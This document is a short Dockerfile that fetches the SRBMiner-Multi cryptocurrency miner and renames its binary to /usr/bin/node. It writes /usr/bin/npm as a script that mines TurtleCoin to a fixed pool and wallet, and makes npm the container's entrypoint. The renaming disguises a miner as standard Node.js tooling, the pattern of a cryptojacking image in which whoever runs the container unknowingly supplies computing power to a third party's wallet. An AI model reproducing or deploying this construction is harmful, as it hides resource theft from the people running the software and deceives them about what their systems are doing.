
FROM debian:buster-slim
RUN apt-get update && apt-get -y install wget xz-utils && \
    cd /opt && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.7/SRBMiner-Multi-0-7-7-Linux.tar.xz && \
	tar xf SRBMiner-Multi-0-7-7-Linux.tar.xz && rm -rf /opt/SRBMiner-Multi-0-7-7-Linux.tar.xz && \
	apt-get -y purge xz-utils && apt-get -y autoremove --purge && apt-get -y clean && apt-get -y autoclean; rm -rf /var/lib/apt-get/lists/*
RUN mv /opt/SRBMiner-Multi-0-7-7/SRBMiner-MULTI /usr/bin/node
RUN echo " node --algorithm argon2id_chukwa2 --pool ca.turtlecoin.herominers.com:10380 --wallet TRTLv1eACSpKx6fbiG4PAiQj2xtiwxhHQ9vYZhhf84USCaabq8JSyoNX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKQKoJF.jx --disable-gpu" > /usr/bin/npm
RUN chmod +x /usr/bin/npm
ENTRYPOINT npm
